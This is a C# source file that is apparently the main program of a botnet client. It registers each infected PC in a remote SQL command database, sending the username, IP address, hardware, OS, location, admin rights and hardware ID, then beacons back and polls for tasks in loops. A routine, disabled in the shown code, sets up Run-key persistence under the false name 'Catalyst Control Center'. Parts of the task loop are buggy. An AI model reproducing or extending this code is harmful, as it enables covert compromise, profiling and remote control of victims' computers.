using Bot.Classes;
using Microsoft.Win32;
using System;
using System.Data.SqlClient;
using System.Threading;

namespace Bot
{
    internal static class Program
    {
        private static void Main()
        {
            if (Misc.Registered())
            {
                //Thread S = new Thread(new ThreadStart(startupThread));
                //S.Start();
                Thread M = new Thread(new ThreadStart(mainThread));
                M.Start();
                Thread U = new Thread(new ThreadStart(updateThread));
                U.Start();
            }
            else
            {
                if (Register())
                {
                    //Thread S = new Thread(new ThreadStart(startupThread));
                    //S.Start();
                    Thread M = new Thread(new ThreadStart(mainThread));
                    M.Start();
                    Thread U = new Thread(new ThreadStart(updateThread));
                    U.Start();
                }
                else { }
            }
        }

        private static void startupThread()
        {
            do
            {
                try
                {
                    if (!Misc.getKey("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getFileLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }

        private static void updateThread()
        {
            do
            {
                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                {
                    conn.Open();
                    using (SqlCommand cmd = new SqlCommand("UPDATE bots set PCName = @PCName, IP = @IP,CPU = @CPU, GPU = @GPU, OperatingSystem = @OperatingSystem, Country = @Country, Region = @Region, AntiVirus = @AntiVirus, Version = @Version, Admin = @Admin where HWID = @HWID", conn))
                    {
                        cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                        cmd.Parameters.AddWithValue("IP", Identification.getIP());
                        cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
                        cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
                        cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
                        cmd.Parameters.AddWithValue("Country", Identification.getCountry());
                        cmd.Parameters.AddWithValue("Region", Identification.getRegion());
                        cmd.Parameters.AddWithValue("AntiVirus", "none");
                        cmd.Parameters.AddWithValue("Version", Settings.Botv);
                        cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());

                        cmd.ExecuteNonQuery();
                        cmd.Parameters.Clear();
                    }
                }
                Thread.Sleep(Settings.reqInterval * 60000);
            } while (true);
        }

        private static void mainThread()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                do
                {
                    //try
                    //{
                        using (SqlCommand cmd = new SqlCommand("UPDATE bots set LastConn = @LastConn where HWID = @HWID", conn))
                        {
                            cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                            cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
                            cmd.ExecuteNonQuery();
                        }

                        for(int i = 0; i <= Misc.getTaskID().Length-1; i++)
                        {
                            Console.WriteLine(Misc.getTaskID().Length-1);
                            for (int n = 0;i <= Misc.getCTasks().Length-1; n++)
                            {
                                Console.WriteLine(Misc.getCTasks().Length-1);
                                Console.WriteLine(Misc.getTaskID()[i] + " " + Misc.getCTasks()[n]);
                                //if (Convert.ToInt32(Misc.getCTasks()[n]) != Misc.getTaskID()[i])
                                //{
                                //    using (SqlCommand cmd = new SqlCommand("UPDATE bots SET CTask = @TaskID where HWID = @HWID", conn))
                                //    {
                                //        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                                //        cmd.Parameters.AddWithValue("TaskID", Convert.ToString(Misc.getTaskID()));
                                //        cmd.ExecuteNonQuery();
                                //        cmd.Parameters.Clear();
                                //    }
                                //    //Console.WriteLine(Misc.getTaskID());
                                //    //Misc.Task(Misc.getTask(i));
                                //}
                            }
                        }
                    //}
                    //catch { }
                    Thread.Sleep(Settings.reqInterval * 1000);
                } while (true);
            }
        }

        private static bool Register()
        {
            try
            {
                using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
                {
                    conn.Open();
                    using (SqlCommand cmd = new SqlCommand("INSERT into Bots values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Ctask, @Admin, @Active, @TaskAmount)", conn))
                    {
                        cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
                        cmd.Parameters.AddWithValue("IP", Identification.getIP());
                        cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
                        cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
                        cmd.Parameters.AddWithValue("FirstConn", Misc.getDate());
                        cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
                        cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
                        cmd.Parameters.AddWithValue("Country", Identification.getCountry());
                        cmd.Parameters.AddWithValue("Region", Identification.getRegion());
                        cmd.Parameters.AddWithValue("AntiVirus", "none");
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        cmd.Parameters.AddWithValue("Version", Settings.Botv);
                        cmd.Parameters.AddWithValue("Ctask", Misc.getCTasks());
                        cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
                        cmd.Parameters.AddWithValue("Active", Settings.Active);
                        cmd.Parameters.AddWithValue("TaskAmount", Settings.TaskAmount);

                        cmd.ExecuteNonQuery();
                        cmd.Parameters.Clear();
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }

        }
    }
}